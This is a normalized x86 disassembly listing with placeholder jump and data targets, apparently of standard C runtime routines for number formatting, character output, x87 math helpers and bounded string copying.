mov ebx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
dec ecx
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ edx ] 0x2d
mov esi ebx
jne r-xdata
cmp ecx edi
jne r-xdata
mov eax [ edx + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edx ] 0x2d
sete al
add eax ecx
mov [ eax + ebx ] 0x30
add esi eax
push 0x1
push esi
push [ ebp + 0xc ]
push ebx
call sub_4357b5
add esp 0x10
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
push 0x1
push esi
push [ ebp + 0xc ]
push ebx
call sub_4357b5
mov eax [ ebp - 0xc ]
add esp 0x10
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jns r-xdata
test edi edi
jle r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov edi ecx
neg edi
mov eax ecx
neg eax
cmp eax edi
jge r-xdata
push edi
push esi
push [ ebp + 0xc ]
push ebx
call sub_4357b5
push edi
push 0x30
push esi
call sub_40de60
add esp 0x1c
sub_4355f5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x18 ]
xor eax eax
lea edi [ ebp - 0x10 ]
push [ ebp + 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
mov edi [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_442540
mov eax [ ebp - 0xc ]
xor ecx ecx
mov ebx [ ebp + 0xc ]
add esp 0x18
cmp [ ebp - 0x10 ] 0x2d
sete cl
dec eax
mov [ ebp - 0x4 ] eax
or eax 0xffffffff
lea esi [ ecx + ebx ]
cmp [ ebp + 0x10 ] eax
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push edi
push eax
push esi
call sub_43fd3a
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
sub eax ecx
mov eax [ ebp - 0xc ]
dec eax
cmp [ ebp - 0x4 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ ebx ] 0x0
jmp r-xdata
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push edi
push [ ebp + 0x10 ]
push ebx
call sub_435346
add esp 0x20
cmp eax edi
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test cl cl
je r-xdata
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push edi
push [ ebp + 0x10 ]
push ebx
call sub_43551e
add esp 0x18
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
mov [ esi - 0x2 ] al
sub_4356bd
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push ebx
mov bl [ ebp + 0xc ]
movzx eax bl
add eax 0x4
cmp edx eax
jae r-xdata
test bl bl
je r-xdata
push 0xc
mov [ ecx ] 0x0
pop eax
mov eax r--data
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x44 ] eax
xor ebx ebx
cmp [ ebp + 0x18 ] bl
mov [ ebp - 0x40 ] eax
mov eax r--data
mov [ ebp - 0x3c ] eax
setne bl
mov [ ebp - 0x38 ] eax
dec ebx
mov eax r--data
mov [ ebp - 0x1c ] r--data
mov [ ebp - 0x2c ] eax
and ebx 0x2
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi r--data
mov [ ebp - 0x14 ] r--data
push edi
lea edi [ eax * 4 - 0x4 ]
mov [ ebp - 0x34 ] esi
lea eax [ edi + ebx ]
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] r--data
mov esi [ ebp + eax * 4 - 0x44 ]
lea eax [ esi + 0x1 ]
mov [ ebp - 0x48 ] eax
mov [ ecx ] 0x2d
inc ecx
dec edx
mov [ ecx ] 0x0
mov al [ esi ]
inc esi
test al al
jne r-xdata
sub esi [ ebp - 0x48 ]
cmp esi edx
sbb eax eax
inc edi
add eax edi
add eax ebx
push [ ebp + eax * 4 - 0x44 ]
push edx
push ecx
call sub_42cfc7
add esp 0xc
pop edi
pop esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
sub_4357b5
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x10 ]
mov ecx esi
push edi
lea edi [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
lea eax [ ecx + 0x1 ]
push eax
lea eax [ esi + edx ]
push esi
push eax
call sub_416810
add esp 0xc
pop edi
pop esi
sub_4357f4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
pop ebx
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov esi [ ebp + 0x1c ]
cmp esi 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp esi 0x45
je r-xdata
mov eax [ ebp + 0x24 ]
and eax 0x10
or eax 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_434f1e
mov [ ebp - 0x8 ] eax
pop ecx
test eax eax
je r-xdata
cmp esi 0x46
je r-xdata
push 0x2
push 0x3
jmp r-xdata
push [ ebp - 0x4 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_434f8a
pop ecx
movzx eax al
push eax
push [ ebp - 0x8 ]
call sub_4356bd
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp esi 0x47
jne r-xdata
sub esi 0x65
je r-xdata
pop eax
cmp esi 0x61
jg r-xdata
mov eax [ ebp + 0x24 ]
and eax 0x8
or eax 0x0
jne r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_4352ab
sub esi 0x1
je r-xdata
push [ ebp + 0x2c ]
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_434fa8
jmp r-xdata
sub esi 0x41
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_435491
add esp 0x1c
jmp r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_4355f5
jmp r-xdata
add esp 0x24
sub esi 0x4
jmp r-xdata
push [ ebp + 0x2c ]
je r-xdata
sub_43593e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
add [ eax + 0x8 ] 0xfffffffe
mov edx [ ebp + 0xc ]
cmp [ edx + 0x8 ] 0x0
jge r-xdata
mov ecx [ edx ]
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ edx ] 0x2
pop ebp
retn
movzx eax [ ebp + 0x8 ]
push edx
push eax
call sub_433134
pop ecx
pop ecx
pop ebp
retn
sub_435970
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
push ebx
push esi
push edi
call sub_432468
mov ebx rw-data
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
push [ ebp + 0x8 ]
call sub_43593e
pop ecx
pop ecx
jmp r-xdata
mov eax ebx
push edi
call sub_432468
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40c3ae
mov esp ebp
pop ebp
retn
push edi
push [ ebp + 0x8 ]
call sub_43593e
pop ecx
pop ecx
cmp al 0x1
je r-xdata
push edi
call sub_432468
mov esi eax
push edi
sar esi 0x6
call sub_432468
and eax 0x3f
imul eax eax 0x30
pop ecx
pop ecx
add eax [ esi * 4 + rw-data ]
jmp r-xdata
push edi
call sub_432468
pop ecx
cmp eax 0xffffffff
je r-xdata
mov al [ eax + 0x29 ]
cmp al 0x2
je r-xdata
test [ ebx + 0x28 ] 0x80
je r-xdata
push edi
call sub_432468
pop ecx
cmp eax 0xfffffffe
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_434609
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_432468
mov esi eax
push edi
sar esi 0x6
call sub_432468
and eax 0x3f
imul ebx eax 0x30
pop ecx
pop ecx
add ebx [ esi * 4 + rw-data ]
mov eax 0xffff
jmp r-xdata
xor esi esi
cmp [ ebp - 0x10 ] esi
jle r-xdata
pop esi
pop ebx
mov ax [ ebp + 0x8 ]
jmp r-xdata
movsx eax [ ebp + esi - 0xc ]
push edi
push eax
call sub_435b4c
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
inc esi
cmp esi [ ebp - 0x10 ]
jl r-xdata
sub_435abb
push 0xc
push r--data
call sub_40d260
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
mov eax 0xffff
mov [ ebp - 0x1c ] ax
push esi
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
call sub_435970
pop ecx
pop ecx
mov di ax
mov [ ebp - 0x1c ] di
mov [ ebp - 0x4 ] 0xfffffffe
call sub_435b2e
mov ax di
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov eax 0xffff
jmp r-xdata
call sub_40d2a6
retn
sub_435b4c
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub [ edx + 0x8 ] 0x1
jns r-xdata
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cl
inc [ edx ]
movzx eax cl
pop ebp
retn
push edx
push [ ebp + 0x8 ]
call sub_433129
pop ecx
pop ecx
pop ebp
retn
sub_435b9a
push 0xc
push r--data
call sub_40d260
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
push esi
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0xc ]
shr eax 0xc
test al 0x1
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
push esi
push [ ebp + 0x8 ]
call sub_435b4c
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_435c96
mov eax edi
push esi
call sub_432468
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
call sub_40d2a6
retn
mov ecx rw-data
mov eax ecx
cmp edx 0xfffffffe
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
push 0xfffffffe
lea ecx [ ebp - 0x10 ]
push ecx
push rw-data
call sub_410490
add esp 0xc
jmp r-xdata
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x6
and eax 0x3f
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
mov ecx rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
test [ ecx + 0x2d ] 0x1
je r-xdata
cmp edx 0xfffffffe
je r-xdata
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax edx
sar eax 0x6
and edx 0x3f
imul ecx edx 0x30
add ecx [ eax * 4 + rw-data ]
sub_435cc9
mov edi edi
push ebp
mov ebp esp
mov edx [ rw-data ]
xor eax eax
mov ecx [ ebp + 0x8 ]
or edx 0x1
cmp [ rw-data ] edx
sete al
neg ecx
sbb ecx ecx
and ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_435cf3
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_42fa1d
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ec4
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
add eax 0x4
mov esp ebp
pop ebp
retn
sub_435d3c
mov [ ebp - 0x90 ] 0xfe
fabs
fxch st1
fabs
fxch st1
fpatan
or cl cl
je r-xdata
or ch ch
je r-xdata
fldpi
fsubrp st1
retn
fchs
sub_435d5c
fabs
fld st0
fld st0
fld1
fsubrp st1
fxch st1
fld1
faddp st1
fmulp st1
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x1
jne r-xdata
pop eax
jmp sub_443d53
xor ch ch
fsqrt
retn
sub_435d95
fstp st0
or cl cl
je r-xdata
fstp st0
fldz
or ch ch
je r-xdata
fstp st0
fldpi
or ch ch
je r-xdata
retn
fchs
retn
fchs
sub_435dd0
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
fwait
fnstcw [ ebp - 0xa4 ]
fwait
push eax
push ecx
push edx
call sub_429cbe
cmp al 0x0
pop edx
pop ecx
pop eax
jne r-xdata
fxch st1
fst [ ebp - 0x86 ]
fxch st1
fst [ ebp - 0x7e ]
jmp r-xdata
call sub_443c07
or [ ebp - 0x2c8 ] 0x3
call sub_435e9f
pop ebx
leave
retn
sub_435e14
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
fwait
fnstcw [ ebp - 0xa4 ]
push eax
push ecx
push edx
call sub_429cbe
cmp al 0x0
pop edx
pop ecx
pop eax
jne r-xdata
fst [ ebp - 0x86 ]
jmp r-xdata
call sub_443ba0
or [ ebp - 0x2c8 ] 0x1
and [ ebp - 0x2c8 ] 0xfd
call sub_435e9f
pop ebx
leave
retn
sub_435e57
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_436019
add esp 0x8
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_436019
add esp 0x8
fwait
fnstcw [ ebp - 0xa4 ]
or [ ebp - 0x2c8 ] 0x2
call sub_443c07
call sub_435e98
pop ebx
leave
retn
sub_435e9f
cmp [ rw-data ] 0x0
jne r-xdata
fldcw [ ebp - 0xa4 ]
fwait
retn
fst [ ebp - 0x2d0 ]
mov al [ ebp - 0x90 ]
or al al
je r-xdata
mov ax [ ebp - 0xa4 ]
and ax 0x20
jne r-xdata
cmp al 0xff
je r-xdata
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov ax [ ebp - 0x2ca ]
and ax 0x7ff0
cmp ax 0x7ff0
je r-xdata
cmp al 0xfe
je r-xdata
mov [ ebp - 0x8e ] 0x8
jmp r-xdata
mov [ ebp - 0x8e ] 0x3
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
jbe r-xdata
jmp r-xdata
mov ax [ ebp - 0x2ca ]
and ax 0x7ff0
or ax ax
je r-xdata
or al al
je r-xdata
push esi
push edi
mov ebx [ ebp - 0x94 ]
inc ebx
mov [ ebp - 0x8a ] ebx
test [ ebp - 0x2c8 ] 0x1
jne r-xdata
fmul [ r--data ]
mov [ ebp - 0x8e ] 0x4
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
jae r-xdata
cmp ax 0x7ff0
je r-xdata
movsx eax al
mov [ ebp - 0x8e ] eax
jmp r-xdata
fstp [ ebp - 0x76 ]
lea eax [ ebp - 0x8e ]
lea ebx [ ebp - 0xa4 ]
push ebx
push eax
mov ebx [ ebp - 0x94 ]
mov al [ ebx + 0xe ]
movsx eax al
push eax
call sub_443da9
add esp 0xc
pop edi
pop esi
fld [ ebp - 0x76 ]
jmp r-xdata
cld
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x86 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx + 0xc ] 0x1
je r-xdata
fmul [ r--data ]
jmp r-xdata
jmp r-xdata
lea esi [ ebp + 0x10 ]
lea edi [ ebp - 0x7e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_435fe6
push ebp
mov ebp esp
add esp 0xfffffd30
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_436019
add esp 0x8
fwait
fnstcw [ ebp - 0xa4 ]
and [ ebp - 0x2c8 ] 0xfd
call sub_443ba0
call sub_435e98
pop ebx
leave
retn
sub_436019
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ax [ ebp + 0xe ]
mov bx ax
and ax 0x7ff0
cmp ax 0x7ff0
jne r-xdata
fld [ ebp + 0x8 ]
or bx 0x7fff
mov [ ebp - 0x2 ] bx
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
shld eax ebx 0xb
mov [ ebp - 0x6 ] eax
mov [ ebp - 0xa ] ebx
fld [ ebp - 0xa ]
jmp r-xdata
pop ebx
leave
retn
sub_436060
cmp [ rw-data ] 0x0
je sub_4360ef
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne sub_4360ef
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_443f18
sub_4360a0
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_444138
call sub_4360f8
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_443f00
sub_4360f8
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
pop edx
retn
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fcos
fwait
fnstsw ax
sahf
jpe r-xdata
fldcw [ r--data ]
fstp st0
fld [ r--data ]
mov eax 0x1
cmp [ rw-data ] 0x0
jne r-xdata
fld [ r--data ]
fxch st1
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x12
lea ecx [ rw-data ]
call sub_444257
fprem1
fwait
fnstsw ax
sahf
jpe r-xdata
fstp st1
fcos
jmp r-xdata
mov edx 0x12
lea ecx [ rw-data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_444257
pop edx
retn
sub_436190
cmp [ rw-data ] 0x0
je sub_43621f
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne sub_43621f
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_4442b8
sub_4361d0
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_444138
call sub_436228
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_4442a0
sub_436228
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
pop edx
retn
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fsin
fwait
fnstsw ax
sahf
jpe r-xdata
fldcw [ r--data ]
fstp st0
fld [ r--data ]
mov eax 0x1
cmp [ rw-data ] 0x0
jne r-xdata
fld [ r--data ]
fxch st1
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x1e
lea ecx [ rw-data ]
call sub_444257
fprem1
fwait
fnstsw ax
sahf
jpe r-xdata
fstp st1
fsin
jmp r-xdata
mov edx 0x1e
lea ecx [ rw-data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_444257
pop edx
retn
sub_4362b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi sub_429ceb
push [ rw-data ]
call [ DecodePointer@IAT ]
mov edi eax
jmp r-xdata
sub eax 0x1b
je r-xdata
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax 0x1a
jg r-xdata
mov [ ebp - 0x24 ] 0x2
sub eax 0x1
je r-xdata
fld1
cmp eax 0xe
jg r-xdata
fld [ ebp - 0xc ]
fstp [ esi ]
call sub_42fef5
mov [ eax ] 0x22
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x15
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub eax 0xf
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x24 ] 0x1
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x24 ] 0x3
mov [ ebp - 0x20 ] r--data
jmp r-xdata
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x21
jmp r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x24 ] 0x4
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
jmp r-xdata
mov [ ebp - 0x24 ] 0x3
jmp r-xdata
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x1
je r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x3ab
je r-xdata
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
fld [ eax ]
jmp r-xdata
sub eax 0x1
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x10 ]
fstp [ eax ]
jmp r-xdata
mov [ ebp - 0x20 ] r--data
sub_4364ca
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] 0x1
pop ebp
retn
and [ rw-data ] 0x0
pop ebp
retn
sub_43651d
push edx
fwait
fnstcw [ esp ]
mov eax [ esp + 0xc ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
call sub_4440dc
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x80000000
jne r-xdata
call sub_4440c5
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0x7ff00000
jne r-xdata
fsqrt
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x5
lea ecx [ rw-data ]
call sub_444257
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
test eax 0xfffff
jne r-xdata
mov edx 0x5
lea ecx [ rw-data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
jmp r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_444257
pop edx
retn
sub_4365ba
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_4365f9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_42fef5
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edi [ ebp + 0x10 ]
test edi edi
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
test ecx ecx
je r-xdata
add edx 0x2
sub ecx 0x1
jne r-xdata
sub edi edx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_42fef5
push 0x22
jmp r-xdata
movzx eax [ edi + edx ]
mov [ edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
sub_43666b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_42fef5
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov edx edi
xor esi esi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add edx 0x2
sub ecx 0x1
jne r-xdata
sub ebx edx
cmp [ edx ] si
je r-xdata
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov [ edi ] ax
call sub_42fef5
push 0x22
jmp r-xdata
movzx eax [ ebx + edx ]
mov [ edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_42fdcf
sub_4366e0
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_42fef5
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
xor eax eax
mov [ edx ] ax
xor eax eax
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
pop esi
pop ebp
retn
mov [ edx ] ax
call sub_42fef5
push 0x22
jmp r-xdata
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
sub_436740
